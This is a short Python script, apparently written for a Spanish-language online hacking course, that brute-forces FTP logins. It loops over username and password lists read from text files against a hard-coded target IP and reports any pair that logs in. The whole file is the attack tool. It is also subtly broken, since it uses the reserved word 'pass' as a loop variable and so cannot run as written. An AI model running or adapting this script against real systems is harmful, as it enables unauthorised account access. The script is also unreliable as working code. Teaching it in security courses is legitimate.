"""
Basado https://www.udemy.com/course/python-de-0-hasta-hacking/learn/lecture/12050334#overview

tenemos un txt con ususarios y otro con contraseñas a probar

"""

#!/usr/bin/env python
#_*_ coding: utf8 _*_

import ftplib

def brute(ip,usuario,password):
    ftp = ftplib.FTP(ip)
    try:
        ftp.login(usuario, password)
        ftp.quit()
        print('Conexion exitosa con: {}:{}'.format(usuario,password))
    except:
        print('Intento Login incorrecto')

def main():
    ip = "192.168.0.5" #ip obketivo
    usuarios = open('usuarios.txt','r')
    usuarios = usuarios.read().split('\n') #q ignore los saltos de linea
    passwords = open('passwords.txt','r')
    passwords = passwords.read().split('\n') #q ignore los saltos de linea

    for user in usuarios:
        for pass in passwords:
            brute(ip,user,pass)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()